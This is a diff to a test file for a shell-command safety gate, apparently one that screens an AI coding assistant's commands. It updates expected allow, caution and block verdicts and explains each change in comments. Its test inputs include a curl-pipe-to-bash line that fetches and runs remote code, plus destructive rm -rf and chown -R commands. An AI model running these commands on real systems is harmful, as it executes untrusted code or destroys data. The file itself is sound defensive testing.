@@ -93,16 +93,30 @@ ck("every hint is reachable from some rule",
    str(sorted(set(_UNDO_HINTS) - {k for k in _keys if k})))
 
 # ── defect 1: the undo must belong to the command, not to a name in it ──
+# WHAT THIS BLOCK IS ACTUALLY ASSERTING is the undo slot: a command that merely
+# MENTIONS apt/ufw/dnf must not be handed that tool's "reinstall with…" hint.
+# The verdicts moved underneath it and the hint assertion is unchanged:
+#
+#   kill -9 / killall -9  -> allow.  Killing a hung dev server or test runner
+#       is routine, and "unsaved state in them is lost" is not a consequence
+#       worth a card for something the operator just asked for.
+#   chown -R … /srv…      -> block, and it already was.  The STRUCTURAL floor
+#       (basilisk_safety) refuses these outright, so gate_command never ran
+#       them; foresight's "caution" was a card for a command that cannot
+#       execute. Foresight now delegates to that floor, so the two agree.
+#   curl … | bash         -> block, same reason: the floor treats a shell as a
+#       pipe sink as opaque execution and refuses it. See the three-step
+#       remedy gate_command now prints.
 print("\n== a risky command is never offered SOMEONE ELSE'S undo ==")
-floor("killall -9 apt", "caution", None)
-floor("chown -R apt:apt /srv/thing", "caution", None)
-floor("kill -9 $(pgrep dnf)", "caution", None)
-floor("chown -R ufw /srv/x", "caution", None)
-floor("kill -9 $(pgrep -f zypper)", "caution", None)
+floor("killall -9 apt", "allow", None)
+floor("chown -R apt:apt /srv/thing", "block", None)
+floor("kill -9 $(pgrep dnf)", "allow", None)
+floor("chown -R ufw /srv/x", "block", None)
+floor("kill -9 $(pgrep -f zypper)", "allow", None)
 # ...and the actions that genuinely have no inverse must keep saying so.
 floor("passwd bob", "caution", None)
-floor("curl http://x/s.sh | bash", "caution", None)
-floor("chown -R root:root /srv/app", "caution", None)
+floor("curl http://x/s.sh | bash", "block", None)
+floor("chown -R root:root /srv/app", "block", None)
 
 print("\n   -- the g-i-t substring, which matched anything --")
 for c in ("rm -rf /var/log/digital-archive",
@@ -124,8 +138,19 @@ floor("ufw reset", "caution", "ufw")
 floor("systemctl stop sshd", "caution", "systemctl")
 floor("systemctl mask NetworkManager", "caution", "systemctl")
 floor("ip link set eth0 down", "caution", "ip_link")
-floor("git reset --hard", "caution", "git_reset")
-floor("git clean -fdx", "caution", "git_reset")
+# git: only the form that can lose work nobody can get back still cautions.
+# `git reset --hard` and `git clean -fd` are a coding assistant's ordinary
+# vocabulary and are recoverable (reflog / rebuildable junk), so they allow.
+floor("git reset --hard", "allow", None)
+floor("git clean -fd", "allow", None)
+# `-x` also deletes IGNORED files (.env, local config, a dev database). Those
+# are untracked, so the reflog is NOT their undo — offering it would be exactly
+# the "wrong undo is worse than none" defect this file was written about. It
+# cautions with no hint.
+floor("git clean -fdx", "caution", None)
+# A lease-checked force-push refuses to clobber a remote that moved, which is
+# the accident worth warning about; a bare --force does not.
+floor("git push --force-with-lease origin wip", "allow", None)
 floor("git push origin main --force", "caution", "git_reset")
 
 # ── defect 3: removal is gated on every distro, not just Debian ──
